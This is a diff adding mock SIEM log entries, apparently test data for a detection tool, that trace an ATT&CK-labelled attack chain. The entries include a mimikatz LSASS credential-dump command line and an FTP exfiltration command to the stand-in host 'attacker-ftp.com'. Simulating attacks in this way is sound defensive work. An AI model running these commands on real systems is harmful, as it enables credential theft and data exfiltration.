@@ -6,8 +6,17 @@ import fs from "fs";
 
 // Mock SIEM Logs (ECS Compliant)
 const MOCK_LOGS = [
+  // Initial Access: Phishing (T1566.001)
   {
-    "@timestamp": new Date().toISOString(),
+    "@timestamp": "2026-03-22T08:00:00Z",
+    "host": { "name": "WKSTN-01" },
+    "user": { "name": "jdoe" },
+    "process": { "name": "outlook.exe", "command_line": "outlook.exe /open Invoice.doc" },
+    "event": { "category": "file", "action": "creation" }
+  },
+  // Execution: PowerShell (T1059.001)
+  {
+    "@timestamp": "2026-03-22T08:05:00Z",
     "host": { "name": "WKSTN-01" },
     "user": { "name": "jdoe" },
     "process": {
@@ -16,8 +25,9 @@ const MOCK_LOGS = [
     },
     "event": { "category": "process", "action": "start" }
   },
+  // Persistence: Scheduled Task (T1053.005)
   {
-    "@timestamp": new Date(Date.now() + 1000 * 60 * 5).toISOString(),
+    "@timestamp": "2026-03-22T08:10:00Z",
     "host": { "name": "WKSTN-01" },
     "user": { "name": "jdoe" },
     "process": {
@@ -26,8 +36,17 @@ const MOCK_LOGS = [
     },
     "event": { "category": "process", "action": "start" }
   },
+  // Discovery: Account Discovery (T1087.001)
   {
-    "@timestamp": new Date(Date.now() + 1000 * 60 * 15).toISOString(),
+    "@timestamp": "2026-03-22T08:15:00Z",
+    "host": { "name": "WKSTN-01" },
+    "user": { "name": "jdoe" },
+    "process": { "name": "net.exe", "command_line": "net user /domain" },
+    "event": { "category": "process", "action": "start" }
+  },
+  // Credential Access: LSASS Dump (T1003.001)
+  {
+    "@timestamp": "2026-03-22T08:20:00Z",
     "host": { "name": "WKSTN-01" },
     "user": { "name": "jdoe" },
     "process": {
@@ -35,6 +54,22 @@ const MOCK_LOGS = [
       "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit"
     },
     "event": { "category": "process", "action": "start" }
+  },
+  // Lateral Movement: RDP (T1021.001)
+  {
+    "@timestamp": "2026-03-22T08:30:00Z",
+    "host": { "name": "WKSTN-01" },
+    "user": { "name": "jdoe" },
+    "process": { "name": "mstsc.exe", "command_line": "mstsc.exe /v:DC-01" },
+    "event": { "category": "network", "action": "connection" }
+  },
+  // Exfiltration: FTP (T1048)
+  {
+    "@timestamp": "2026-03-22T09:00:00Z",
+    "host": { "name": "DC-01" },
+    "user": { "name": "admin" },
+    "process": { "name": "ftp.exe", "command_line": "ftp.exe -s:commands.txt attacker-ftp.com" },
+    "event": { "category": "network", "action": "connection" }
   }
 ];
 
